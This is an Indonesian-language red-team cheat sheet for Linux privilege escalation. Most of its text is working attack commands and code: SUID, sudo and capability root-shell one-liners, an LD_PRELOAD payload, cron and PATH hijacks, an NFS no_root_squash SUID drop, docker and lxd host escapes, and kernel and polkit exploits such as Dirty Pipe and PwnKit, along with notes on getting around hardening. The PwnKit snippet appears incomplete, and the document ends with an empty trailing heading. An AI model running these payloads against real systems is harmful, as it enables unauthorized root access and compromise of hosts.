# privesc-linux — linux

# Linux Privilege Escalation — Referensi Red Team

## 1. Enumerasi Baseline

### 1.1 linpeas (PEASS-ng, rilis 2024+)

Diperlukan: akses shell unprivileged, curl/wget atau upload.

```bash
# Kirim via HTTP
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/lp.sh
chmod +x /tmp/lp.sh
./lp.sh -a 2>&1 | tee /tmp/lp.out
```

Muncul: SUID/SGID anomali, capability `cap_*`, cron writable, sudo `-l`, NFS exports, grup (docker/lxd/disk), kernel version, writable PATH dirs, `/etc/passwd` writable, kredensial di env/history/`.git`.

Gagal bila: AV/EDR memblokir, `noexec` pada `/tmp`, hilang curl/wget + tidak bisa upload, shell rpm/restricted.

### 1.2 pspy (pspy64, rilis 1.2.0)

```bash
./pspy64 -pf -i 1000 2>&1 | tee /tmp/pspy.out
```

Memantau proses/cron tiap 1s tanpa root. Muncul: cron root menjalankan script di path writable, `/bin/sh -c` dari systemd timer, backup jobs dengan argumen yang bisa di-inject.

---

## 2. SUID / SGID Abuse (GTFOBins)

### 2.1 Enumerasi

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
# Bandingkan ke baseline GTFOBins; cek juga interpreter yg SUID
```

### 2.2 Payload keluarga GTFOBins

| Binary SUID | Perintah (root shell) | Syarat |
|---|---|---|
| `nmap` (≤5.20 w/ `--interactive`) | `nmap --interactive` → `!sh` | SUID + versi lama |
| `vim` / `vi` | `vim -c ':!/bin/sh'` | SUID |
| `find` | `find . -exec /bin/sh -p \; -quit` | `-p` mempertahankan EUID |
| `bash` | `/bin/bash -p` | SUID + bukan setuid-ignored |
| `less` / `more` | `less /etc/passwd` → `!sh` | SUID |
| `cp` | `cp /bin/sh /tmp/x; chmod +s /tmp/x; /tmp/x -p` | ≥ SUID |
| `env` | `env /bin/sh -p` | SUID |
| `awk` | `awk 'BEGIN{system("/bin/sh")}'` | SUID |
| `perl` | `perl -e 'exec "/bin/sh";'` | SUID + `-p` EUID utuh |
| `tar` | `tar cf /dev/null /etc/shadow --checkpoint=1 --checkpoint-action=exec=/bin/sh` | SUID |
| `python3` | `python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'` | SUID |
| `mount` | `mount -o bind /bin/sh /bin/mount; mount` | SUID mount cepat gagal; lihat catatan |
| `pkexec` | lihat §9 PwnKit | SUID + versi rentan |
| `sudo` | `sudo -l` | SUID + cek sudoers |

Konfirmasi EUID: `id` bila shell turunan tetap root — gunakan `-p` (`bash -p`, `sh -p`) untuk mencegah bash drop privilege.

### 2.3 Kenapa gagal di lapangan
- Kernel ≥ 3.14 dengan `nosuid` mount (`/tmp`, `/home` via autofs).
- Binary SUID modern (bash ≥ 4.3?) sudah men-drop privilege: `/bin/bash` SUID tidak memberi shell root tanpa `-p`.
- Hardening: `fs.protected_suid_dumpable`, SELinux `nosuid`, atau AppArmor profile yang membatasi exec.

---

## 3. Linux Capabilities

### 3.1 Enumerasi

```bash
getcap -r / 2>/dev/null
# Alternatif
find / -type f -exec getcap {} \; 2>/dev/null
```

### 3.2 Payload capability

| Binary | Cap | Payload |
|---|---|---|
| `python3` | `cap_setuid+ep` | `python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'` |
| `perl` | `cap_setuid+ep` | `perl -e 'use POSIX; setuid(0); exec "/bin/sh";'` |
| `tar` | `cap_dac_read_search+ep` | `tar -cvf /tmp/shadow.tar /etc/shadow` (baca shadow) |
| `openssl` / `gdb` | `cap_dac_read_search+ep` | baca `/etc/shadow` |
| `cap_net_raw+ep` di `ping`/`tcpdump` | — | sniffer / ARP-spoof |
| `cap_net_admin+ep` di `nmap`/`tcpdump` | — | raw socket / veth |

### 3.3 Kenapa gagal
- `ep` vs `p`: `cap_setuid+p` tanpa `e` tidak berlaku untuk exec normal (perlu `capsh --inh` atau filecap ruang user-ns).
- File system `nosuid` tidak menonaktifkan capability (terpisah). Namun `nosuid` + `--` pada beberapa distro ikut mengabaikan `security.capability` saat `noexec`.
- Container runtime modern (Docker 25+, containerd) drop semua cap dari set default — SUID dari image tetap jalan tapi cap hilang.

---

## 4. sudo Misconfiguration

### 4.1 Enumerasi

```bash
sudo -n -l                 # tanpa password
sudo -l                    # butuh password user
ls -la /etc/sudoers.d/     # bila bisa dibaca
cat /etc/sudoers 2>/dev/null
```

### 4.2 `NOPASSWD` untuk binary GTFOBins

Format sudo yang salah umum:

```
user ALL=(ALL) NOPASSWD: /usr/bin/vim
user ALL=(ALL) NOPASSWD: /usr/bin/python3 /opt/app.py
user ALL=(root) NOPASSWD: /usr/bin/systemctl
```

| Entry | Escalation |
|---|---|
| `vim` | `sudo vim -c ':!/bin/sh'` |
| `less`/`more` | `sudo less /etc/shadow` → `!sh` |
| `find` | `sudo find / -exec /bin/sh \; -quit` |
| `tar` | `sudo tar cf /dev/null x --checkpoint=1 --checkpoint-action=exec=/bin/sh` |
| `env` | `sudo env /bin/sh` |
| `awk` | `sudo awk 'BEGIN{system("/bin/sh")}'` |
| `systemctl` | `sudo systemctl edit x` menulis unit; atau `sudo systemctl status x` → `!sh` bila pager |
| `docker`/`podman` | lihat §8 |
| `apt`/`apt-get` | `sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh` |
| `zip`/`unzip` | `sudo zip /tmp/x /etc/hosts -T --unzip-command="sh -c /bin/sh"` |
| `journalctl` | `sudo journalctl` → `!sh` bila pager tidak aman |

### 4.3 `sudoedit`

Celah klasik: `sudoedit` dieksekusi sebagaimana user dengan `EDITOR` milik **user** — bukan root. Bila `sudoers` berisi:

```
user ALL=(ALL) NOPASSWD: sudoedit /etc/nginx/nginx.conf
```

Bukan langsung shell. Tetapi bila pattern-nya wildcard dan target writable lewat symlink, atau bila `sudoedit` (versi < 1.8.31) mengizinkan path traversal `../../../` di argumen file, baca/tulis file root.

Payload symlink:

```bash
ln -s /etc/shadow /tmp/evil
sudo sudoedit /tmp/evil      # hanya bila target di sudoers mencakup /tmp/evil
```

### 4.4 `env_keep` + `LD_PRELOAD`

Sudoers:

```
Defaults env_keep += "LD_PRELOAD"
```

Atau di `/etc/ld.so.preload`. Payload:

```c
/* /tmp/x.c */
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
__attribute__((constructor)) void init(void){
    setuid(0); setgid(0);
    system("cp /bin/sh /tmp/rootshell; chmod 4755 /tmp/rootshell");
}
```

```bash
gcc -shared -fPIC -o /tmp/x.so /tmp/x.c
sudo LD_PRELOAD=/tmp/x.so /bin/true
/tmp/rootshell -p
```

Cek juga `env_keep` lain: `LD_AUDIT`, `LD_LIBRARY_PATH`, `PYTHONPATH`, `PERL5OPT`, `RUBYOPT`, `GEM_HOME`, `NODE_OPTIONS`.

### 4.5 Kenapa sudo gagal
- `secure_path` mengabaikan `PATH` user → PATH hijack gugur.
- `env_reset` (default) menghapus `LD_PRELOAD`, `LD_LIBRARY_PATH` → §4.4 tidak jalan meski `env_keep` tidak dikonfigurasi secara eksplisit.
- `sudo` ≥ 1.9.x dengan `sudoedit_checkdir` (default on sejak 1.8.15) memblokir symlink traversal.
- `requiretty` / `use_pty` memutus eksfil via pager interaktif.

---

## 5. Cron & systemd Timer Writable

### 5.1 Cron

```bash
ls -la /etc/cron.* /var/spool/cron /var/spool/cron/crontabs 2>/dev/null
cat /etc/crontab /etc/cron.d/* 2>/dev/null
crontab -l 2>/dev/null
# Watchdog: pspy64 -pf
```

Pola eksploitasi:

| Skenario | Payload |
|---|---|
| Script root di path writable | `echo 'cp /bin/sh /tmp/r; chmod 4755 /tmp/r' >> /opt/backup.sh` |
| Directory writable, script dihapus | `cp /bin/sh /opt/backup.sh; chmod +x /opt/backup.sh` (tunggu cron) |
| Path wildcard `tar *` di `/etc/cron.d` | tar wildcard injection (lihat §2.2) |
| `CRON` script tanpa shebang absolute | PATH crontab minimal `/usr/bin:/bin` — sulit di-hijack |

Skala waktu: cron default tiap menit; script `run-parts` di `/etc/cron.hourly` bisa telat hingga 1 jam.

### 5.2 systemd timer

```bash
systemctl list-timers --all
systemctl cat <timer>.timer <timer>.service
ls -la /etc/systemd/system/*.timer /lib/systemd/system/*.timer
```

Cek `ExecStart=` menunjuk script/path writable, atau environment file `EnvironmentFile=` writable:

```bash
# bila /etc/sysconfig/foo writable
echo 'ExecStart=/bin/sh -c "cp /bin/sh /tmp/r; chmod 4755 /tmp/r"' > /etc/sysconfig/foo
# tunggu timer; atau, bila unit writable:
systemctl restart suspicious.timer
```

### 5.3 Kenapa gagal
- `root` cron memakai `PATH=/usr/bin:/bin` dan `SHELL=/bin/sh` — hijack PATH user tidak berpengaruh.
- `cron` di Debian/Ubuntu punya `pam_env`, environment kustom dibersihkan.
- Anacron vs cron: `/etc/cron.daily` via anacron berjalan sekali sehari — window sempit.

---

## 6. PATH Hijack

### 6.1 Prasyarat & Enum

```bash
echo $PATH
find / -type d -writable 2>/dev/null
# Cari script root yang memanggil binary non-absolut
grep -rE 'system\(|popen\(|exec' /opt /usr/local 2>/dev/null | head
pspy64 -pf | grep -E 'sh -c|systemctl'
```

### 6.2 Payload

```bash
mkdir -p /tmp/x && cd /tmp/x
cat > gzip <<'EOF'
#!/bin/sh
cp /bin/sh /tmp/r && chmod 4755 /tmp/r
EOF
chmod +x gzip
export PATH=/tmp/x:$PATH
# tunggu script root yang memanggil `gzip`/`tar`/`python` tanpa path absolut
```

Untuk sudo dengan `secure_path`: `sudo PATH=/tmp/x:$PATH cmd` tidak jalan — `secure_path` override. Namun bila script root memanggil `backup.sh` via relative `./backup`, dan cwd script writable, hijack script.

### 6.3 Kenapa gagal
- `secure_path` (sudo), `ENV_PATH` (cron/systemd) menetapkan PATH absolut → hijack user tidak berlaku.
- Binary dipanggil absolut (`/usr/bin/gzip`) di source script.
- `fs.protected_symlinks=1` + symlink attack konsekuensi.

---

## 7. NFS `no_root_squash`

### 7.1 Enum target

```bash
showmount -e <target>
# atau dari shell target
cat /etc/exports
grep -E 'nfs|nfs4' /proc/mounts
```

Response `showmount`:

```
Export list for target:
/opt    *
/srv    *(rw,no_root_squash)
```

`no_root_squash` berarti UID 0 klien = UID 0 server.

### 7.2 Exploit — SUID drop

Dari host attacker (root lokal):

```bash
mkdir -p /tmp/nfs && mount -t nfs -o vers=3 <target>:/srv /tmp/nfs
cat > /tmp/nfs/x.c <<'EOF'
#include <unistd.h>
int main(void){ setuid(0); setgid(0); execl("/bin/sh","sh",NULL); }
EOF
gcc -o /tmp/nfs/x /tmp/nfs/x.c && chmod 4755 /tmp/nfs/x
umount /tmp/nfs
```

Di target:

```bash
/srv/x        # root shell, karena suid dimiliki root DAN binary di NFS no_root_squash
```

### 7.3 Varian lain
- `/home` NFS no_root_squash → tulis `.ssh/authorized_keys` untuk root (jika home root di NFS).
- `/etc` NFS no_root_squash → tulis `/etc/ld.so.preload`.
- Kerberos NFS (`sec=krb5`) memblokir klaim UID 0 — teknik gugur kecuali credential NFS root ada.

### 7.4 Kenapa gagal
- Export `root_squash` (default) → UID 0 klien dipetakan ke `nobody`.
- `all_squash` + `anonuid` → semua UID flatten.
- Firewall: `rpcbind`/`nfsd` hanya 111/2049 internal.
- NFSv4 via `sec=sys` masih bisa; `sec=krb5p` tidak.

---

## 8. docker / lxd Group

### 8.1 Docker group

```bash
id
docker ps 2>/dev/null && echo DOCKER_GROUP_OK
```

Payload mount host:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# spesifik: drop SUID di host
docker run -v /:/mnt --rm -it alpine \
  sh -c 'cp /bin/sh /mnt/tmp/r; chmod 4755 /mnt/tmp/r'
```

Variasi tanpa internet:

```bash
docker run -v /:/mnt --rm -it --entrypoint /bin/sh <image_yang_ada>
```

Bila docker socket (`/var/run/docker.sock`) di-mount ke container yang sudah di shell — identik: `curl --unix-socket /var/run/docker.sock http://localhost/containers/json`.

### 8.2 lxd group

```bash
id | grep -o '\blxd\b' && lxc list
```

Payload:

```bash
# image alpine mini (harus tersedia/lokal, lxd tidak bisa pull tanpa network)
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh
# di dalam: cp /bin/sh /mnt/root/tmp/r; chmod 4755 /mnt/root/tmp/r; exit
```

Alternatif `security.privileged=false` dengan idmap `root` — lxd ≥ 3.x masih ok selama daemon tidak di-hardening.

### 8.3 Kenapa gagal
- Docker 25+/27+ dengan `userns-remap` → `--privileged` tetap, tapi bind-mount host `/` tetap bisa menulis karena mount namespace? **Tidak**: `userns-remap` memetakan UID 0 container ke UID host bukan-root, sehingga `chmod 4755` di `/tmp` host menjadi milik UID acak — SUID tidak jadi root host. Deteksi: `docker info | grep -i userns` atau `cat /etc/docker/daemon.json`.
- Docker ≥ 20.10 dengan `no-new-privileges` default pada sebagian distro.
- lxd ≥ 5.0 dengan `security.privileged=true` diblokir bila `/etc/subuid` belum disiapkan (image tidak dapat idmap) atau profil `default` memaksa `security.nesting=false`.
- AppArmor/SELinux label `container_t` mencegah write ke `host-root`.

---

## 9. Kernel CVE — Ringkasan Operasional

| CVE | Nama | Kernel terpengaruh | Payload minimal | Prasyarat |
|---|---|---|---|---|
| CVE-2022-0847 | Dirty Pipe | 5.8 – 5.16.11 (fix di 5.16.11/5.15.25/5.10.102) | Tulis `/etc/passwd` atau overwrite SUID `/usr/bin/sudo` byte | unprivileged user; `splice()` tidak butuh cap |
| CVE-2021-4034 | PwnKit (pkexec) | polkit 0.105–0.120 (Ubuntu 20.04, Debian 11, RHEL 8 default) | `pkexec` argc=0 → getenv argv overflow | binary `pkexec` SUID ada; tidak perlu kernel spesifik |
| CVE-2024-1086 | nf_tables UAF | Linux ≤ 6.6.14, distro patch lambat (Ubuntu 22.04 < 5.15.0-100) | `nft` user namespace + ruleset, trigger double-free → ROP | `unprivileged_userns_clone=1` atau `kernel.unprivileged_userns_clone=1` |
| CVE-2023-32233 | nf_tables UAF (batch) | 6.3.1 ≤ kernel < 6.3.5; distro 5.15/6.1 belum patch | nft batch replace, lalu unshare user-netns | userns enabled |
| CVE-2024-21626 | runc (Leaky Vessels) | runc ≤ 1.1.11 | `docker run --rm -w /proc/self/fd/7` | akses docker/podman |
| CVE-2023-0386 | OverlayFS UAF | Ubuntu ≤ 22.04 (5.15.0-69?), RHEL 8 | FUSE + overlay, drop SUID di file lower | userns + FUSE |

### 9.1 Dirty Pipe (contoh konkret)

Dari PoC publik `blasty-vs-dirtypipe`:

```bash
git clone https://github.com/.../CVE-2022-0847-dirty-pipe-poc
gcc -o dp dp.c
./dp /usr/bin/su /tmp/su.bak

# atau overwrite /etc/passwd: suntik root tanpa password
# root:$(openssl passwd -1 -salt x pwn):0:0:root:/root:/bin/bash
./dp /etc/passwd /tmp/passwd.bak
su root   # password: pwn
```

**Kenapa gagal**: kernel ≥ 5.16.11, atau `CONFIG_` patch distro meski banner kernel tampak lama (backport). Verifikasi: `uname -r` **saja tidak cukup** — cek `/boot/config-$(uname -r)` atau uji PoC benign (buka file read-only dengan `splice()` + `write` → `EPERM`).

### 9.2 PwnKit

```bash
# PoC: argv kosong -> pkexec baca env sebagai argv[0]
mkdir -p /tmp/pk && cd /tmp/pk
cat > pwn.c <<'EOF'
#include <unistd.h>
int main(int c, char**v){ char *a[]={"pkexec","--help",NULL}; char *e[]={"PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=/bin/sh", "GIO_USE_VFS=local", NULL}; execve("/usr/bin/pkexec", a, e); }
EOF
gcc -o pwn pwn.c && ./pwn
```

Pada Ubuntu 20.04.3 / 21.04 / 21.10 / Debian 11 default, `pkexec` SUID + polkit rentan → root shell tanpa password. Fixed: polkit 0.120-1ubuntu2 (CVE-2021-4034).

**Kenapa gagal**: polkit dipatch, atau `pkexec` tidak SUID (RedHat/CentOS sudah — pkexec SUID tapi polkit 0.120 → **tetap rentan**; cek `rpm -q polkit`), atau `pkexec` dihapus.

### 9.3 nf_tables CVE-2024-1086

Payload: `CVE-2024-1086` PoC (Notselwyn) — butuh user namespace (unprivileged):

```bash
sysctl kernel.unprivileged_userns_clone   # 1 = aktif, 0 = userns off
cat /proc/sys/kernel/unprivileged_userns_clone
```

Bila `0`, teknik gugur di Debian/Ubuntu (default Ubuntu 24.04 masih 1; Debian 12 masih 1; RHEL 8/9 = 0).

**Kenapa gagal**: `kernel.unprivileged_userns_clone=0`, `user.max_user_namespaces=0`, AppArmor profile pada `unshare` (Ubuntu 24.04 `unprivileged_userns` restrict).

---

## 10. Jebakan Operasional Lapangan (ringkas)

| Jebakan | Dampak | Mitigasi |
|---|---|---|
| `uname -r` tidak mencerminkan backport distro | Dirty Pipe / nf_tables PoC crash atau EPERM | Uji patch distro via `apt changelog` / `rpm -q --changelog` / cek `/proc/version_signature` (Ubuntu) |
| `unprivileged_userns_clone=0` + AppArmor restrict | Semua kernel-namespace exploit (1086, 32233, 0386) mati | Cek `/proc/sys/user/max_user_namespaces`; pakai jalur non-userns |
| `userns-remap` Docker/LXD | §8 payload `chmod 4755` menghasilkan SUID milik UID non-root host | Baca `docker info`, `lxc profile show default` |
| `secure_path` + `env_reset` di sudo | PATH hijack & `LD_PRELOAD` mati | Cek `sudo -l` untuk `env_keep` eksplisit; jangan harap default |
| NFS `root_squash` default | §7 suid drop tidak menjadi root server | `showmount -e`; cek `/etc/exports` bila ada |
| `pkexec` sudah dihapus / polkit patched | PwnKit gagal walau kernel tua | Cek versi paket, bukan kernel |
| Cron `PATH=/usr/bin:/bin` + script dipanggil absolut | §5/§6 mati | Fokus ke file **writable**, bukan path hijack |
| `pspy` tidak menangkap proses <1s | Cron bernama `wget -q -O- ... \| sh` luput | Turunkan interval `-i 100` atau `-f` (inotify-like pada /proc) |
| `noexec` pada `/tmp`/`/dev/shm` | Payload `.so` / script tidak exec | Fallback `/var/tmp`, `memfd_create`, exec via interpreter (`python3 /tmp/x.py`) |
| Kernel SAS (SELinux/AppArmor) | `docker run -v /:/mnt` menulis file tapi `chmod 4755` ditolak label | `getenforce` / `aa-status`; cari writable berlabel `container_file_t` yang di-mount ke host `unconfined_t` |
| Docker daemon `--userns-remap` aktif | SUID drop tidak esk ke root host | `docker info | grep -i userns`; alternatif tulis `authorized_keys` ke `/root` di mount (jalan bila root container UID 0 masih root host pada mount path tertentu — verifikasi) |
| `sudo` ≥ 1.9 dengan `sudoedit_checkdir` | Symlink `sudoedit` gagal | Cari juga `edit` wildcard & `sudo -e` ke direktori writable langsung |
| `cap_setuid+p` tanpa `+e` | `python3` cap SUID tidak esk | Verifikasi `getcap`; butuh `cap_setuid+ep` atau `cap_setuid+i` (inheritable) pada exec |
| `nosuid` mount + SUID file | `find -perm -4000` false positive, exec tidak esk | `mount | grep nosuid`; cek `findmnt -no OPTIONS <path>` |

---

## [reasoning trace]


